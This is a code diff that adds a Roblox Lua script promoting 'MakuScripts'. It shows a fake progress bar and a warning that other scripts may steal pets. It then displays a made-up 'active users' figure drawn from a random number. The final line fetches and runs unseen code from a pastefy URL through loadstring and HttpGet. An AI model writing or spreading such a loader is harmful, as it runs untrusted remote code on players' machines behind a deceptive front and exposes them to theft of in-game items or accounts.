@@ -1,0 +1,103 @@
+-- UI LIB
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+
+-- Screen GUI
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+ScreenGui.ResetOnSpawn = false
+
+-- Main Frame
+local Frame = Instance.new("Frame", ScreenGui)
+Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+Frame.Size = UDim2.new(0, 450, 0, 200)
+Frame.BackgroundTransparency = 0.3
+Frame.BackgroundColor3 = Color3.new(0, 0, 0)
+Frame.BorderSizePixel = 0
+
+-- Icon
+local Icon = Instance.new("ImageLabel", Frame)
+Icon.Image = "rbxassetid://90044972199356"
+Icon.Size = UDim2.new(0, 60, 0, 60)
+Icon.Position = UDim2.new(0, 20, 0, 15)
+Icon.BackgroundTransparency = 1
+
+-- Title
+local Title = Instance.new("TextLabel", Frame)
+Title.Text = "Youtube: MakuScripts"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.TextScaled = true
+Title.Font = Enum.Font.GothamBold
+Title.Position = UDim2.new(0, 100, 0, 15)
+Title.Size = UDim2.new(1, -120, 0, 30)
+Title.BackgroundTransparency = 1
+
+-- Subtitle
+local Subtitle = Instance.new("TextLabel", Frame)
+Subtitle.Text = "Subscribe To MakuScripts"
+Subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
+Subtitle.TextScaled = true
+Subtitle.Font = Enum.Font.Gotham
+Subtitle.Position = UDim2.new(0, 0, 1, -35)
+Subtitle.Size = UDim2.new(1, 0, 0, 30)
+Subtitle.BackgroundTransparency = 1
+
+-- Progress Bar
+local BarBackground = Instance.new("Frame", Frame)
+BarBackground.Position = UDim2.new(0.05, 0, 0.65, 0)
+BarBackground.Size = UDim2.new(0.9, 0, 0.1, 0)
+BarBackground.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+BarBackground.BorderSizePixel = 0
+BarBackground.BackgroundTransparency = 0.1
+BarBackground.ClipsDescendants = true
+
+local ProgressBar = Instance.new("Frame", BarBackground)
+ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+ProgressBar.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
+ProgressBar.BorderSizePixel = 0
+
+-- Tween
+TweenService:Create(ProgressBar, TweenInfo.new(20), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+
+-- Warning popup after bar fills
+task.delay(20, function()
+    Frame:Destroy()
+
+    local Message = Instance.new("TextLabel", ScreenGui)
+    Message.AnchorPoint = Vector2.new(0.5, 0.5)
+    Message.Position = UDim2.new(0.5, 0, 0.4, 0)
+    Message.Size = UDim2.new(0, 500, 0, 50)
+    Message.Text = "⚠️ Beware of other scripts — they may steal your pets!"
+    Message.TextScaled = true
+    Message.Font = Enum.Font.GothamBold
+    Message.TextColor3 = Color3.new(1, 1, 1)
+    Message.BackgroundColor3 = Color3.new(0, 0, 0)
+    Message.BackgroundTransparency = 0.3
+    Message.BorderSizePixel = 0
+
+    task.delay(5, function()
+        Message:Destroy()
+
+        -- Show user count popup
+        local CountPopup = Instance.new("TextLabel", ScreenGui)
+        CountPopup.AnchorPoint = Vector2.new(0.5, 0.5)
+        CountPopup.Position = UDim2.new(0.5, 0, 0.4, 0)
+        CountPopup.Size = UDim2.new(0, 500, 0, 50)
+        local count = math.random(39200, 41000)
+        CountPopup.Text = "💬 There are currently " .. tostring(count) .. " active users"
+        CountPopup.TextScaled = true
+        CountPopup.Font = Enum.Font.GothamBold
+        CountPopup.TextColor3 = Color3.new(1, 1, 1)
+        CountPopup.BackgroundColor3 = Color3.new(0, 0, 0)
+        CountPopup.BackgroundTransparency = 0.3
+        CountPopup.BorderSizePixel = 0
+
+        task.delay(5, function()
+            CountPopup:Destroy()
+
+            -- YOUR MAIN SCRIPT GOES HERE
+            loadstring(game:HttpGet("https://pastefy.app/43esfgzQ/raw"))()
+        end)
+    end)
+end)
